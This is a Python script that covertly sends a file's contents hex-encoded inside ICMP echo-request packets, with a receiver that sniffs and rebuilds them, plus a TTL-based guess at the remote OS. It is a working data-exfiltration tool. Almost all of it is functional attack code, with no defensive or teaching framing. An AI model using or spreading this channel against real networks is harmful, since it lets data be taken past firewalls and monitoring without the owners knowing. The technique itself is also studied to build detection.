from scapy.all import IP, ICMP, Raw, sr, sniff
import subprocess
import sys
import re
import ipaddress
import os
import netifaces


########################## SEND ##########################

def send_data(ip_address, file):
    """
    Sends data from a file to a specified IP address over ICMP packets.

    Args:
        ip_address (str): The destination IP address.
        file (str): Path to the file to be sent.

    """
    # Attempt to read the file
    try:
        with open(file, 'rb') as f:
            file_data = f.read()
    except FileNotFoundError:
        print(f"[-] File {file} not found")
        sys.exit(1)
    
    print(ip_address)
    
    # Encode file data into hexadecimal strings
    try:
        encoded_file = [file_data[i:i+32].hex() for i in range(0, len(file_data), 32)]
    except Exception as e:
        print(f"[-] Error encoding file data: {e}")
        sys.exit(1)
    
    # Send each chunk of encoded data in an ICMP packet
    for encoded_data in encoded_file:
        try:
            payload = (IP(dst=ip_address, ttl=128) / ICMP(type=8, id=12321) / Raw(load=encoded_data))
            sr(payload, timeout=0, verbose=0)
        except Exception as e:
            print(f"[-] Error sending packet: {e}")
    
    # Send a final packet indicating end of file transmission
    exit_text = "FIEOF".encode().hex()
    try:
        payload = (IP(dst=ip_address, ttl=128) / ICMP(type=8, id=12321) / Raw(load=exit_text))
        sr(payload, timeout=0, verbose=0)
    except Exception as e:
        print(f"[-] Error sending end packet: {e}")


########################## RECEIVE #########################

def data_parser(packet_info):
    """
    Callback function to parse incoming ICMP packets and write the data to a file.

    Args:
        packet_info: The packet information captured by scapy's sniff function.

    """
    # Check if the packet is an ICMP echo request with the correct ID and has a payload
    if packet_info[ICMP].type == 8 and packet_info[ICMP].id == 12321 and packet_info[Raw].load:
        # Decode the payload from bytes to string, ignoring errors
        byte_data = packet_info[Raw].load.decode('utf-8', errors="ignore").replace('\n', '')
        try:
            # Convert the hexadecimal string back to bytes
            data = bytes.fromhex(byte_data)
            # Check for end of file indicator
            if b"FIEOF" in data:
                print("[+] End of transmission received")
                exit()
            # Write the decoded data to 'out.txt'
            with open('out.txt', 'a') as a:
                a.write(data.decode())
            print("[SUCCESS] Saved to file out.txt [SUCCESS]")
        except Exception as e:
            print(f"[-] Error decoding or writing data: {e}")


def start(ip, mode):
    """
    Initiates the appropriate mode of operation: send or receive.

    Args:
        ip (str): The IP address to communicate with.
        mode (str): The mode of operation ('send' or 'recv').

    """
    if mode == "recv":
        # Check if the script is run as root
        if os.getuid() != 0:
            print("[+] Run as root!")
            return
        
        # Get the list of available network interfaces
        interface_list = netifaces.interfaces()
        userInterface = input("Interface: ")
        if userInterface not in interface_list:
            print(f"[-] {userInterface} is not a valid interface")
            print(f"These are your interfaces: {interface_list}")
            sys.exit(1)
        
        print("Listening....")
        # Start sniffing for ICMP packets on the specified interface
        sniff(iface=userInterface, prn=data_parser, filter="icmp")
        print("[SUCCESS] Saved to file [SUCCESS]")
    
    elif mode == "send":
        # Validate the IP address
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            print(f"[-] {ip} is not a valid IP address")
            sys.exit(1)
        
        # Perform a ping to the target IP to determine its TTL and OS type
        try:
            ping_host = subprocess.run([f"ping -c 1 {ip}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
            output = ping_host.stdout.decode()
            ttl_match = re.search(r'ttl=(\d+)', output)
            if ttl_match:
                ttl_value = int(ttl_match.group(1))
                ip_address = re.findall(r"\d+\.\d+\.\d+\.\d+", output)[0]
                print(f"[+] IP Address: {ip_address}")
                print(f"[+] TTL Value: {ttl_value}")
                if ttl_value in range(0, 65):
                    print("[+] Linux Host [+]")
                elif ttl_value in range(65, 129):
                    print("[+] Windows Host [+]")
            else:
                print("[-] Unable to determine TTL value from ping response")
        except IndexError as e:
            print(f"Error: {e}")
        except subprocess.CalledProcessError as e:
            print(f"[-] Ping command failed: {e}")

if __name__ == "__main__":
    # Prompt the user to select the mode of operation
    option = input("> Type: [s] for sending data from a file, [r] to receive in out.txt: ")
    if option == "s":
        start("127.0.0.1", "send")
        send_data("127.0.0.1", input("[-] file path to send data from: "))
    elif option == "r":
        start("127.0.0.1", "recv")
